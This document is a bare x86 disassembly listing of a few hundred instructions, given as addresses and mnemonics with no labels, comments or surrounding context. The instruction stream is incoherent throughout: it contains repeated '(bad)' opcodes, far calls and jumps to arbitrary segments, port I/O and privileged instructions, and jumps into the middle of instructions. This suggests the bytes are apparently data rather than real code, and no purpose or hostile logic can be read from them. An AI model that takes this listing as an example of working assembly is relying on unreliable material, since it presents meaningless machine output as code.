  407aeb:	adc    ecx,DWORD PTR [ecx]
  407aed:	inc    ecx
  407aee:	gs retf 0x50a7
  407af2:	(bad)  [esi-0x266a4a4]
  407af8:	(bad)  
  407af9:	push   esi
  407afa:	adc    DWORD PTR [eax],0x1c
  407afd:	lahf   
  407afe:	jb     0x407ad3
  407b00:	scas   al,BYTE PTR es:[edi]
  407b01:	addr16 jbe 0x407a85
  407b04:	retf   0x9169
  407b07:	lods   al,BYTE PTR ds:[esi]
  407b08:	adc    eax,0x47a19726
  407b0d:	pop    esi
  407b0e:	call   0x3e8:0xdbccdb20
  407b15:	mov    esi,0xc8ff019c
  407b1a:	and    BYTE PTR [ecx],0x6b
  407b1d:	fst    QWORD PTR ds:0x4656f482
  407b23:	mov    cl,0xe5
  407b25:	xlat   BYTE PTR ds:[ebx]
  407b26:	aad    0xdd
  407b28:	mov    ds:0x3d7acad,al
  407b2d:	jo     0x407b2a
  407b2f:	or     bl,BYTE PTR gs:[ebx-0x401d7ccf]
  407b36:	inc    esi
  407b37:	push   ecx
  407b38:	out    0xff,al
  407b3a:	sbb    al,BYTE PTR [ebx+0x1d0f9e72]
  407b40:	push   ds
  407b41:	rol    DWORD PTR [ecx-0x1297880c],0x63
  407b48:	in     eax,0x42
  407b4a:	mov    esp,0xaaf19d78
  407b4f:	into   
  407b50:	cmp    dh,ch
  407b52:	mov    ebx,0xae34a814
  407b57:	retf   0x5561
  407b5a:	mov    edi,0x85449c9f
  407b5f:	jg     0x407ae5
  407b61:	jno    0x407b3c
  407b63:	add    esp,DWORD PTR [edi+0x3a5ad84c]
  407b69:	jo     0x407b55
  407b6b:	bound  esp,QWORD PTR [esi]
  407b6d:	jo     0x407bd9
  407b6f:	sbb    ch,dl
  407b71:	ret    0x7f60
  407b74:	not    DWORD PTR [eax-0x38]
  407b77:	inc    ebp
  407b78:	xor    DWORD PTR [edi+0xc],ebp
  407b7b:	cdq    
  407b7c:	inc    ebx
  407b7d:	or     eax,0xaf7de8f1
  407b82:	arpl   WORD PTR [ebp+edi*1-0x2aae04d5],bp
  407b89:	or     eax,0x85f3a95f
  407b8e:	(bad)  
  407b8f:	call   0xeff376ab
  407b94:	adc    eax,0x565ab42e
  407b99:	neg    BYTE PTR [ecx+0x549133e5]
  407b9f:	mov    ch,0x7
  407ba1:	jmp    0x407c1c
  407ba3:	xor    al,0xf7
  407ba5:	rcl    cl,cl
  407ba7:	pop    ecx
  407ba8:	rcl    BYTE PTR [eax],0x29
  407bab:	sti    
  407bac:	in     eax,dx
  407bad:	or     cl,BYTE PTR [ecx-0x5d]
  407bb0:	popa   
  407bb1:	repz mov bl,0x91
  407bb4:	cdq    
  407bb5:	out    dx,eax
  407bb6:	cmp    DWORD PTR cs:[esi+0x4de1ddd5],ebx
  407bbd:	jnp    0x407bff
  407bbf:	push   es
  407bc0:	scas   al,BYTE PTR es:[edi]
  407bc1:	ins    DWORD PTR es:[edi],dx
  407bc2:	jl     0x407c02
  407bc4:	inc    esi
  407bc5:	inc    eax
  407bc6:	pop    edi
  407bc7:	cmp    bh,BYTE PTR [edx-0x1d6aa3bd]
  407bcd:	aad    0xeb
  407bcf:	(bad)  
  407bd0:	test   al,0x6
  407bd2:	pop    ds
  407bd3:	js     0x407b7e
  407bd5:	stos   DWORD PTR es:[edi],eax
  407bd6:	jecxz  0x407b6f
  407bd8:	loop   0x407b5b
  407bda:	loope  0x407bc3
  407bdc:	ja     0x407bfb
  407bde:	pop    esp
  407bdf:	mov    al,ds:0xe05b55a1
  407be4:	or     BYTE PTR [esi],bl
  407be6:	pop    ecx
  407be7:	push   ss
  407be8:	jg     0x407ba6
  407bea:	out    dx,al
  407beb:	xchg   BYTE PTR [edx],cl
  407bed:	enter  0x6e0,0x48
  407bf1:	jbe    0x407bde
  407bf3:	adc    al,0xc1
  407bf5:	inc    eax
  407bf6:	adc    al,0xd6
  407bf8:	lods   eax,DWORD PTR ds:[esi]
  407bf9:	fs inc ebx
  407bfb:	out    0x62,eax
  407bfd:	test   eax,0xde3cd8f5
  407c02:	push   ebp
  407c03:	adc    al,0xbf
  407c05:	jno    0x407ba6
  407c07:	fs rcl ch,cl
  407c0a:	jecxz  0x407c60
  407c0c:	mov    ebx,0x41f6e305
  407c11:	ror    ebp,1
  407c13:	mov    eax,0x5cb8cdda
  407c18:	lods   al,BYTE PTR ds:[esi]
  407c19:	adc    ebx,eax
  407c1b:	(bad)  
  407c1c:	and    eax,0x26e23acb
  407c21:	retf   0xb82
  407c24:	mov    bl,0x60
  407c26:	inc    esi
  407c27:	inc    edi
  407c28:	adc    eax,0xf9fb3dc0
  407c2d:	push   ss
  407c2e:	std    
  407c2f:	(bad)  
  407c30:	mov    ebp,0x4953aa8e
  407c35:	pop    esp
  407c36:	add    esp,ebp
  407c38:	sbb    al,0xbd
  407c3a:	cdq    
  407c3b:	push   ecx
  407c3c:	sbb    ah,bl
  407c3e:	outs   dx,BYTE PTR ds:[esi]
  407c3f:	shl    al,cl
  407c41:	xlat   BYTE PTR ds:[ebx]
  407c42:	loopne 0x407c89
  407c44:	fild   WORD PTR [ebx+0x27c77ffa]
  407c4a:	test   al,0xef
  407c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c4d:	lods   al,BYTE PTR ds:[esi]
  407c4e:	rcl    al,cl
  407c50:	ficomp DWORD PTR [edi+edx*8-0x3d47bcc5]
  407c57:	cmp    al,0x13
  407c59:	lahf   
  407c5a:	mov    ecx,DWORD PTR [edi-0x6d]
  407c5d:	loope  0x407c89
  407c5f:	mov    bl,0x13
  407c61:	scas   eax,DWORD PTR es:[edi]
  407c62:	mov    ds:0x1cfc21b0,al
  407c67:	in     al,0x24
  407c69:	imul   edx,DWORD PTR [eax+0x4a],0x7437cbe3
  407c70:	cmp    esp,DWORD PTR [edx+0xfe6a8cc]
  407c76:	je     0x407cb0
  407c78:	xchg   esp,eax
  407c79:	arpl   WORD PTR [ebx],bx
  407c7b:	ret    
  407c7c:	inc    eax
  407c7d:	js     0x407c42
  407c7f:	cdq    
  407c80:	arpl   WORD PTR [esi+ecx*4],si
  407c83:	jg     0x407c48
  407c85:	push   ebp
  407c86:	out    dx,eax
  407c87:	leave  
  407c88:	sub    DWORD PTR [edi-0x5b],edi
  407c8b:	xchg   edi,eax
  407c8c:	xor    al,0x14
  407c8e:	push   0x63
  407c90:	xchg   ebp,eax
  407c91:	or     DWORD PTR [ebp+0x79bb39b8],ebp
  407c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c98:	push   esp
  407c99:	and    al,0x23
  407c9b:	ss push ebp
  407c9d:	arpl   WORD PTR [eax],di
  407c9f:	fiadd  DWORD PTR [eax]
  407ca1:	gs pop ebp
  407ca3:	xor    eax,0x62e3bf0b
  407ca8:	inc    ebx
  407ca9:	lds    edx,FWORD PTR [eax]
  407cab:	imul   edx,esi,0x64
  407cae:	sbb    DWORD PTR [ebx+0x56],ebx
  407cb1:	mov    ebp,0xbebaa8b5
  407cb6:	mov    al,0xe8
  407cb8:	out    dx,al
  407cb9:	(bad)  
  407cba:	ds or  edx,eax
  407cbd:	push   es
  407cbe:	jl     0x407c47
  407cc0:	rcr    BYTE PTR [edx+0x4ba4d79c],cl
  407cc6:	xlat   BYTE PTR ds:[ebx]
  407cc7:	sub    eax,0xec75d3b3
  407ccc:	sub    DWORD PTR [eax-0x482a71de],esi
  407cd2:	lea    edi,[edi]
  407cd4:	sub    eax,0xb85b3925
  407cd9:	cmp    BYTE PTR [edx-0x51c81d0e],bl
  407cdf:	push   ds
  407ce0:	adc    dl,cl
  407ce2:	daa    
  407ce3:	sub    BYTE PTR [ebx-0x5bdfeaf],cl
  407ce9:	mov    ch,0xff
  407ceb:	loop   0x407d39
  407ced:	sub    ebx,ecx
  407cef:	xchg   esp,eax
  407cf0:	xchg   edi,eax
  407cf1:	mov    ebx,0xe0082e16
  407cf6:	outs   dx,DWORD PTR ds:[esi]
  407cf7:	add    eax,0xf20e1096
  407cfc:	jae    0x407d3d
  407cfe:	pop    ds
  407cff:	stos   DWORD PTR es:[edi],eax
  407d00:	xor    dh,bl
  407d02:	std    
  407d03:	sub    al,0x7b
  407d05:	or     dh,cl
  407d07:	mov    WORD PTR [ebp+0x5d5b26a1],es
  407d0d:	inc    edx
  407d0e:	out    0x32,eax
  407d10:	dec    esp
  407d11:	ds loop 0x407d8f
  407d14:	ins    BYTE PTR es:[edi],dx
  407d15:	addr16 xchg ebx,eax
  407d17:	into   
  407d18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d19:	rcl    ecx,cl
  407d1b:	and    bl,0x4
  407d1e:	xchg   ecx,eax
  407d1f:	dec    esi
  407d20:	jp     0x407ce0
  407d22:	mov    esi,0xd8f5742c
  407d27:	jge    0x407d99
  407d29:	push   ss
  407d2a:	(bad)  
  407d2b:	loop   0x407d3e
  407d2d:	dec    esi
  407d2e:	add    BYTE PTR [ebp+0x57],ah
  407d31:	loopne 0x407ce5
  407d33:	add    bh,ah
  407d35:	jmp    0xf6e3:0x4cd1cde3
  407d3c:	(bad)  [esi]
  407d3e:	test   al,0xad
  407d40:	mov    bh,0xe9
  407d42:	mov    dh,0x8
  407d44:	xchg   edi,eax
  407d45:	rcl    BYTE PTR [eax],cl
  407d47:	outs   dx,BYTE PTR ds:[esi]
  407d48:	or     al,0x56
  407d4a:	xchg   edx,eax
  407d4b:	or     al,0x85
  407d4d:	xchg   DWORD PTR [ebp+0x58ddd072],edx
  407d53:	jg     0x407d3a
  407d55:	pop    ss
  407d56:	loop   0x407d73
  407d58:	in     al,0x99
  407d5a:	popf   
  407d5b:	dec    BYTE PTR [ebp-0x1b]
  407d5e:	inc    ebx
  407d5f:	imul   ecx
  407d61:	(bad)  
  407d62:	pop    ss
  407d63:	push   edi
  407d64:	lea    edi,[esi+0xa13b75a]
  407d6a:	and    BYTE PTR [esi],dl
  407d6c:	sbb    eax,0x9b19aaa4
  407d71:	imul   ebx,eax,0x5c054275
  407d77:	cs icebp 
  407d79:	or     ebp,esp
  407d7b:	adc    bl,BYTE PTR [edx+0x5c02d90c]
  407d81:	push   eax
  407d82:	xchg   DWORD PTR [ebx+ebx*4-0x76],ebp
  407d86:	mov    ecx,0xc7dd4af9
  407d8b:	sbb    eax,0x809f124a
  407d90:	adc    DWORD PTR [ebx],ebx
  407d92:	mov    BYTE PTR gs:[edi+ebx*2+0x17],dh
  407d97:	scas   eax,DWORD PTR es:[edi]
  407d98:	int3   
  407d99:	inc    ebp
  407d9a:	rcr    BYTE PTR [esi+esi*1-0x45],1
  407d9e:	inc    eax
  407d9f:	push   ds
  407da0:	mov    dh,0x19
  407da2:	add    eax,0x2cb41b86
  407da7:	arpl   WORD PTR [ebp+0x62],dx
  407daa:	push   es
  407dab:	lea    edx,[ebx]
  407dad:	mov    dl,dl
  407daf:	shl    BYTE PTR [eax+ecx*2],cl
  407db2:	out    dx,al
  407db3:	sub    al,0x51
  407db5:	test   BYTE PTR [edx],0xa0
  407db8:	dec    edx
  407db9:	js     0x407dfc
  407dbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dbc:	addr16 call 0xfab7:0x1d2021f3
  407dc4:	scas   eax,DWORD PTR es:[edi]
  407dc5:	lock sahf 
  407dc7:	cli    
  407dc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dc9:	lods   al,BYTE PTR ds:[esi]
  407dca:	jmp    0x3c5ee48a
  407dcf:	mov    bh,0xab
  407dd1:	outs   dx,DWORD PTR ds:[esi]
  407dd2:	jae    0x407d7a
  407dd4:	leave  
  407dd5:	pop    esp
  407dd6:	pop    ebx
  407dd7:	mov    esi,0xc0355816
  407ddc:	jno    0x407d5f
  407dde:	cwde   
  407ddf:	or     ebp,0x40
  407de2:	ror    DWORD PTR ds:0x3499e214,cl
  407de8:	adc    al,0x7e
  407dea:	sub    BYTE PTR [edi+ebp*1+0x44],bh
  407dee:	add    bl,BYTE PTR [esi-0x3d]
  407df1:	xchg   esi,eax
  407df2:	and    esi,DWORD PTR [eax+0x26]
  407df5:	jmp    0x407e0e
  407df7:	js     0x407dc5
  407df9:	sub    al,0x9f
  407dfb:	lods   al,BYTE PTR ds:[esi]
  407dfc:	or     DWORD PTR [esi],esp
  407dfe:	daa    
  407dff:	out    dx,eax
  407e00:	push   edi
  407e01:	outs   dx,DWORD PTR ds:[esi]
  407e02:	fisttp QWORD PTR [ebx+esi*4]
  407e05:	mov    ebx,0xd4856691
  407e0a:	pushf  
  407e0b:	addr16 push eax
  407e0d:	xchg   esp,eax
  407e0e:	and    al,0x5f
  407e10:	mov    esp,0x616e21db
  407e15:	sub    cl,BYTE PTR [ebx]
  407e17:	pop    ds
  407e18:	ds xchg edx,eax
  407e1a:	scas   eax,DWORD PTR es:[edi]
  407e1b:	cmp    ebx,DWORD PTR [edx+ebp*8]
  407e1e:	push   cs
  407e1f:	dec    edx
  407e20:	lods   al,BYTE PTR ds:[esi]
  407e21:	aad    0xc6
  407e23:	mov    al,0xa9
  407e25:	fdiv   QWORD PTR [edx]
  407e27:	adc    cl,BYTE PTR [eax-0x71]
  407e2a:	jne    0x407dc1
  407e2c:	mov    edx,0x5191879
  407e31:	js     0x407e70
  407e33:	or     eax,0x27ae0fcc
  407e38:	test   BYTE PTR [ecx-0x5c],al
  407e3b:	dec    esp
  407e3c:	and    dl,al
  407e3e:	in     eax,0x44
  407e40:	mov    ch,0x72
  407e42:	mov    ebp,0xe2ce378f
  407e47:	out    dx,al
  407e48:	cwde   
  407e49:	jb     0x407dd6
  407e4b:	xchg   esi,eax
  407e4c:	adc    bl,BYTE PTR ss:[eax-0x3e3ffc41]
  407e53:	leave  
  407e54:	xor    eax,0xe1ce784b
  407e59:	sbb    DWORD PTR ds:0xbbc9bd51,edx
  407e5f:	mov    esp,0x64e59f8
  407e64:	ss call 0x555eee41
  407e6a:	cs in  al,dx
  407e6c:	or     esp,DWORD PTR [eax+0x65e4bbf2]
  407e72:	scas   eax,DWORD PTR es:[edi]
  407e73:	mov    esi,0xa6b186f1
  407e78:	inc    esp
  407e79:	lods   eax,DWORD PTR ds:[esi]
  407e7a:	xor    al,BYTE PTR [ecx+ecx*2]
  407e7d:	iret   
  407e7e:	or     edi,ecx
  407e80:	(bad)
  407e83:	sbb    BYTE PTR [edx],dl
  407e85:	inc    eax
  407e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e87:	clc    
  407e88:	push   es
  407e89:	push   cs
  407e8a:	and    al,0x97
  407e8c:	cmc    
  407e8d:	sbb    DWORD PTR fs:[edx-0x287bb8c7],eax
  407e94:	adc    ah,BYTE PTR [ebx+ebx*8+0x2c3a1a12]
  407e9b:	ror    DWORD PTR [edi-0x5792d670],0x39
  407ea2:	gs retf 
  407ea4:	aaa    
  407ea5:	xchg   ebp,eax
  407ea6:	fldcw  WORD PTR [esi+edi*4+0x3e]
  407eaa:	mov    ds:0x702d91e7,eax
  407eaf:	mov    bl,BYTE PTR [ebx+eax*8+0x69]
  407eb3:	fs aam 0x5c
  407eb6:	xchg   edx,esp
  407eb8:	adc    eax,0xb365fa23
  407ebd:	jmp    0xcf81:0x1aff782a
  407ec4:	(bad)  
  407ec5:	cwde   
  407ec6:	push   ecx
  407ec7:	mov    ecx,0x620ea78a
  407ecc:	inc    ebx
  407ecd:	outs   dx,DWORD PTR ds:[esi]
  407ece:	jecxz  0x407e82
  407ed0:	lods   al,BYTE PTR ds:[esi]
  407ed1:	sahf   
  407ed2:	fistp  QWORD PTR [edx+0x4d09a24d]
  407ed8:	sub    al,0xa6
  407eda:	pusha  
  407edb:	popf   
  407edc:	mov    ah,0x64
  407ede:	sbb    bh,ch
  407ee0:	mov    cl,0x50
  407ee2:	adc    al,0x22
  407ee4:	lahf   
  407ee5:	loop   0x407f64
  407ee7:	call   0xd228:0x99d83bfb
  407eee:	cmp    DWORD PTR [ecx+0x1],eax
  407ef1:	pop    ebx
  407ef2:	mov    ah,0x69
  407ef4:	sbb    cl,BYTE PTR [edx+0x4]
  407ef7:	mov    edx,0x9323abc3
  407efc:	dec    edx
  407efd:	jmp    0x64ef:0x1e21b659
  407f04:	pop    edx
  407f05:	mov    edx,0x1928ceda
  407f0a:	pop    ebp
  407f0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f0c:	std    
  407f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f0e:	jge    0x407f73
  407f10:	push   es
  407f11:	push   ss
  407f12:	not    DWORD PTR ds:0x495ee745
  407f18:	clc    
  407f19:	dec    eax
  407f1a:	das    
  407f1b:	xchg   ebx,eax
  407f1c:	push   edx
  407f1d:	and    DWORD PTR [eax-0x6e01b02c],ebp
  407f23:	hlt    
  407f24:	stos   DWORD PTR es:[edi],eax
  407f25:	cmp    BYTE PTR ds:0xca0ce12f,dl
  407f2b:	push   ss
  407f2c:	inc    ebp
  407f2d:	test   BYTE PTR [esi+0x15bcb108],bl
  407f33:	jo     0x407f35
  407f35:	push   0xfc2fed9d
  407f3a:	pop    ebp
  407f3b:	and    esp,eax
  407f3d:	inc    BYTE PTR [esi-0x16fb2f8]
  407f43:	xor    DWORD PTR [eax-0x2],ebp
  407f46:	push   eax
  407f47:	into   
  407f48:	sub    bh,BYTE PTR [edi]
  407f4a:	add    BYTE PTR ds:0xe8d08597,0xe9
  407f51:	add    al,0xab
  407f53:	aaa    
  407f54:	aam    0x9
  407f56:	fidiv  WORD PTR [ecx+0x3fe44988]
  407f5c:	sbb    eax,0x1d1bc792
  407f61:	xor    BYTE PTR [edi+0x20438cd2],0xce
  407f68:	int3   
  407f69:	(bad)  
  407f6a:	mov    ds:0x4b9598e8,al
  407f6f:	mov    esp,ebx
  407f71:	push   cs
  407f72:	mov    eax,ds:0x685e1a5e
  407f77:	xor    WORD PTR [edx-0x4de9971f],ax
  407f7e:	add    al,0x79
  407f80:	hlt    
  407f81:	fxch   st(5)
  407f83:	push   ss
  407f84:	popa   
  407f85:	mov    bh,0xdd
  407f87:	xchg   edi,eax
  407f88:	mov    esi,0x6eefde05
  407f8d:	push   ss
  407f8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f8f:	lea    ecx,[esi]
  407f91:	cli    
  407f92:	cmp    al,0x6d
  407f94:	ret    
  407f95:	shl    ebx,0x7e
  407f98:	lahf   
  407f99:	rcr    BYTE PTR [edx],cl
  407f9b:	mov    edi,0x43e57d52
  407fa0:	jo     0x407f53
  407fa2:	jg     0x407f3d
  407fa4:	cdq    
  407fa5:	test   DWORD PTR [eax+0x68],0xa2a586dd
  407fac:	ja     0x407fdc
  407fae:	sbb    al,0x2c
  407fb0:	cld    
  407fb1:	shl    DWORD PTR [edi-0x11ded75c],1
  407fb7:	out    0xaf,al
  407fb9:	pop    es
  407fba:	push   ebx
  407fbb:	add    ebp,DWORD PTR fs:[edx-0x30]
  407fbf:	test   al,0xa8
  407fc1:	mov    eax,0x72297479
  407fc6:	push   ecx
  407fc7:	ror    BYTE PTR [ebp+0x1b],0xb6
  407fcb:	sti    
  407fcc:	sub    eax,0x4de02ddc
  407fd1:	lods   eax,DWORD PTR ds:[esi]
  407fd2:	retf   0x95ef
  407fd5:	cdq    
  407fd6:	jne    0x407fa2
  407fd8:	pop    ss
  407fd9:	mov    ah,0x8f
  407fdb:	mov    al,0xcc
  407fdd:	sar    eax,0xc
  407fe0:	inc    ecx
  407fe1:	mov    al,0x25
  407fe3:	jmp    0x49da:0x9c775fd2
  407fea:	mov    bl,0x35
  407fed:	ret    
  407fee:	jp     0x407fcc
  407ff0:	icebp  
  407ff1:	mov    bh,0x63
  407ff3:	inc    edi
  407ff4:	cmp    BYTE PTR [esi+0x6],bl
  407ff7:	retf   
  407ff8:	jle    0x407fe6
  407ffa:	push   ds
  407ffb:	rol    ecx,1
  407ffd:	in     eax,0xcd
  407fff:	adc    eax,0xcce24ba2
  408004:	repnz test al,0x8
  408007:	mov    esp,ecx
  408009:	mov    dl,0x15
  40800b:	mov    ebp,0xefb1f00f
  408010:	adc    ecx,ebp
  408012:	jecxz  0x407ffd
  408014:	mov    esi,0xb31283cf
  408019:	outs   dx,DWORD PTR ds:[esi]
  40801a:	scas   eax,DWORD PTR es:[edi]
  40801b:	xor    ch,BYTE PTR [ebx]
  40801d:	cli    
  40801e:	loopne 0x408003
  408020:	pop    ebp
  408021:	fistp  WORD PTR [edx+0x6052cfcb]
  408027:	loop   0x407fff
  408029:	xor    eax,0xaefd18a7
  40802e:	pusha  
  40802f:	pop    ebp
  408030:	and    DWORD PTR [ebp-0x66],0x48
  408034:	dec    esi
  408035:	or     DWORD PTR [eax-0x51],ecx
  408038:	outs   dx,DWORD PTR ds:[esi]
  408039:	pop    esp
  40803a:	dec    esi
  40803b:	lods   eax,DWORD PTR ds:[esi]
  40803d:	or     eax,0x9219eef0
  408042:	sahf   
  408043:	add    DWORD PTR [ecx],0xffffffd9
  408046:	and    ebx,ebp
  408048:	xor    al,BYTE PTR [ebx-0x39]
  40804b:	pop    ds
  40804c:	adc    DWORD PTR gs:[edi],ebx
  40804f:	mov    cl,bl
  408051:	mov    bl,0x84
  408053:	jecxz  0x408037
  408055:	dec    ecx
  408056:	aaa    
  408057:	xor    al,0xc1
  408059:	pop    ecx
  40805a:	mov    esp,0x34af50e6
  40805f:	outs   dx,DWORD PTR ds:[esi]
  408060:	pop    esi
  408061:	mov    eax,ds:0x67ccdc40
  408066:	sbb    bl,dh
  408068:	rol    BYTE PTR es:0x38d44581,cl
  40806f:	mov    al,ds:0xfa435b42
  408074:	mov    ds:0x47baffa1,eax
  408079:	fmul   QWORD PTR cs:[ebx+0x6e]
  40807d:	imul   ebp
  40807f:	ss dec ebp
  408081:	retf   
  408082:	imul   esp,DWORD PTR [ecx-0x5865c787],0xffffffb9
  408089:	dec    ecx
  40808a:	addr16 push esi
  40808c:	mov    dl,0x3e
  40808e:	and    BYTE PTR [edi],cl
  408090:	inc    eax
  408091:	jle    0x40809a
  408093:	and    eax,0x830948fc
  408098:	mov    eax,ds:0x3a0b4e34
  40809d:	mov    al,ds:0x5ca1f8e3
  4080a2:	shl    BYTE PTR [edi-0x4a7c59f6],cl
  4080a8:	fisubr WORD PTR [esi+0x5a8b9be9]
  4080ae:	data16 jbe 0x4080cc
  4080b1:	ror    DWORD PTR [edx],cl
  4080b3:	sub    edx,DWORD PTR [edi]
  4080b5:	push   ebp
  4080b6:	out    0xd1,eax
  4080b8:	iret   
  4080b9:	mov    dl,0xc
  4080bb:	mov    edx,es
  4080bd:	daa    
  4080be:	std    
  4080bf:	call   FWORD PTR ds:[ecx]
  4080c2:	(bad)  
  4080c3:	mov    dl,cl
  4080c5:	clc    
  4080c6:	mov    edx,esi
  4080c8:	addr16 mov bh,0x3c
  4080cb:	dec    ebp
  4080cc:	fnstenv [ecx+0xc5335b0]
  4080d2:	pop    ss
  4080d3:	and    DWORD PTR ds:0xd097612,esp
  4080d9:	jbe    0x4080b1
  4080db:	push   0x8286e091
  4080e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080e1:	push   ds
  4080e2:	xor    DWORD PTR [ebx],0x7e
  4080e5:	push   eax
  4080e6:	ja     0x408069
  4080e8:	jbe    0x408131
  4080ea:	int    0x59
  4080ec:	lock lds eax,FWORD PTR [ecx-0x6f]
  4080f0:	cmp    DWORD PTR [edi+0x6d],edx
  4080f3:	pop    eax
  4080f4:	pushf  
  4080f5:	inc    edi
  4080f6:	cmp    bh,bl
  4080f8:	mov    dl,0x84
  4080fa:	lea    edi,[esi]
  4080fc:	add    eax,0xe0642a3b
  408101:	pushf  
  408102:	xchg   edi,eax
  408103:	idiv   BYTE PTR [edi+eiz*1+0x23]
  408107:	cmp    al,0xd3
  408109:	icebp  
  40810a:	mov    DWORD PTR [edx],ebx
  40810c:	xchg   BYTE PTR [edx],bl
  40810e:	rol    DWORD PTR [ecx+0x16],cl
  408111:	cmp    dh,BYTE PTR [eax-0x76]
  408114:	sbb    eax,0x703d4923
  408119:	test   BYTE PTR [edx+0x513cdc92],0xee
  408120:	and    BYTE PTR [bx+di],bh
  408123:	test   al,0xd8
  408125:	(bad)  
  408126:	ss dec esi
  408128:	lds    ebp,FWORD PTR [eax]
  40812a:	xchg   edx,eax
  40812b:	vmwrite esi,DWORD PTR [edx-0x56b6535b]
  408132:	add    al,0x4b
  408134:	sub    ebx,DWORD PTR [ebx-0x8]
  408137:	mov    cl,0x10
  408139:	or     DWORD PTR [ebp-0x46],esp
  40813c:	popf   
  40813d:	cmp    ebx,DWORD PTR [edi+0x38]
  408140:	mov    bl,0x1c
  408142:	into   
  408143:	repnz ss repnz scas eax,DWORD PTR es:[edi]
  408147:	(bad)  
  408148:	dec    esi
  408149:	retf   
  40814a:	pop    ebx
  40814b:	mov    ecx,0x4526053d
  408150:	ins    DWORD PTR es:[edi],dx
  408151:	mov    edi,0x173c9289
  408156:	cmp    ecx,edi
  408158:	call   0x70fe:0x4507961a
  40815f:	push   cs
  408160:	mov    ebp,edi
  408162:	sti    
  408163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408164:	cmp    eax,0x157744cf
  408169:	cld    
  40816a:	push   ss
  40816b:	dec    ecx
  40816c:	mov    eax,0xc3643f6a
  408171:	xchg   esi,eax
  408172:	dec    ecx
  408173:	mov    ds:0xbf65a171,eax
  408178:	fdivr  QWORD PTR [esi-0x533a4abf]
  40817e:	jnp    0x408134
  408180:	add    bh,dh
  408182:	(bad)  [ecx]
  408184:	jmp    0x46adfab
  408189:	jae    0x408206
  40818b:	jmp    0x408201
  40818d:	mov    BYTE PTR [edi+0x7fbbe87c],al
  408193:	sbb    ebp,0xffffff80
  408196:	mov    edi,0x507c8c4e
  40819b:	add    edi,eax
  40819d:	sub    al,0x16
  40819f:	nop
  4081a0:	mov    al,ds:0xddaaad83
  4081a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081a6:	inc    eax
  4081a7:	mov    ecx,0x37b2dcdf
  4081ac:	xchg   ecx,eax
  4081ad:	ficom  DWORD PTR [edi]
  4081af:	and    edx,edi
  4081b1:	push   ds
  4081b2:	jg     0x4081ea
  4081b4:	clc    
  4081b5:	in     al,0x60
  4081b7:	bound  eax,QWORD PTR [esi-0x4090072a]
  4081bd:	enter  0xe625,0x36
  4081c1:	sar    DWORD PTR [ebx-0x7d],1
  4081c4:	sar    BYTE PTR [esi-0x3558f43f],1
  4081ca:	push   0x4d
  4081cc:	jb     0x4081f5
  4081ce:	je     0x408193
  4081d0:	retf   
  4081d1:	in     eax,dx
  4081d2:	dec    edx
  4081d3:	jmp    0x36b052a2
  4081d8:	imul   esi,DWORD PTR [eax-0x43853882],0x1f
  4081df:	ficom  DWORD PTR [ecx]
  4081e1:	gs loope 0x4081ff
  4081e4:	je     0x4081de
  4081e6:	mov    edi,0x725534ab
  4081eb:	rol    DWORD PTR [eax+0x42],cl
  4081ee:	xchg   ebp,ebp
  4081f0:	imul   ebp,edi,0x3541009e
  4081f6:	retf   
  4081f7:	xchg   edi,eax
  4081f8:	cld    
  4081f9:	cmp    al,0x5e
  4081fb:	add    DWORD PTR [eax],ebp
  4081fd:	sti    
  4081fe:	cs dec edi
  408200:	mov    cl,0xc1
  408202:	repz (bad) 
  408204:	in     eax,dx
  408205:	es jne 0x40826e
  408208:	das    
  408209:	fdiv   QWORD PTR [ebx+0x7685ff08]
  40820f:	push   ds
  408210:	mov    bl,0xc1
  408212:	ret    0x9eb9
  408215:	ja     0x4081eb
  408217:	xchg   ecx,eax
  408218:	out    dx,al
  408219:	mov    DWORD PTR [eax],edx
  40821b:	inc    edi
  40821c:	fidivr DWORD PTR [ebx]
  40821e:	jp     0x40825c
  408220:	inc    ebp
  408221:	xor    eax,0x15142252
  408226:	iret   
  408227:	in     eax,dx
  408228:	push   esp
  408229:	mov    ch,0xa
  40822b:	dec    edi
  40822c:	scas   eax,DWORD PTR es:[edi]
  40822d:	int    0x9b
  40822f:	fmul   DWORD PTR gs:0xb19a408d
  408236:	fs dec eax
  408238:	in     eax,dx
  408239:	push   ebp
  40823a:	sahf   
  40823b:	xor    esp,eax
  40823d:	shl    BYTE PTR [eax+0x33645708],1
  408243:	pop    edi
  408244:	faddp  st(0),st
  408246:	sbb    ah,0x24
  408249:	inc    ebx
  40824a:	add    DWORD PTR [edx+0x53],edx
  40824d:	inc    esi
  40824e:	sub    ebx,DWORD PTR [ebp-0x231d1b39]
  408254:	mov    bl,BYTE PTR [esi+0x41]
  408257:	inc    esi
  408258:	jno    0x408211
  40825a:	aas    
  40825b:	ja     0x408290
  40825d:	inc    ebx
  40825e:	fbld   TBYTE PTR [eax]
  408260:	inc    edx
  408261:	push   eax
  408262:	pop    ebp
  408263:	jg     0x4081ee
  408265:	ja     0x408269
  408267:	fldcw  WORD PTR [ebx+eiz*4-0x45]
  40826b:	sbb    DWORD PTR [ebx+0x69],edi
  40826e:	loop   0x4082a1
  408270:	xchg   edi,eax
  408271:	jns    0x4082eb
  408273:	aaa    
  408274:	ins    BYTE PTR es:[edi],dx
  408275:	imul   eax,DWORD PTR [ebx+0x5f435e2d],0xfffffff9
  40827c:	sbb    eax,0x9a2588ac
  408281:	jp     0x4082c2
  408283:	add    ecx,eax
  408285:	sbb    bl,BYTE PTR [edx+0x6e]
  408288:	and    eax,DWORD PTR [edi]
  40828a:	xlat   BYTE PTR ds:[ebx]
  40828b:	call   0xf7bf9031
  408290:	sahf   
  408291:	mov    dh,BYTE PTR [edi]
  408293:	int3   
  408294:	neg    BYTE PTR [ebp+0x7e]
  408297:	xor    eax,0xf3e44767
  40829c:	xor    DWORD PTR [ebx+0x43d26d49],esi
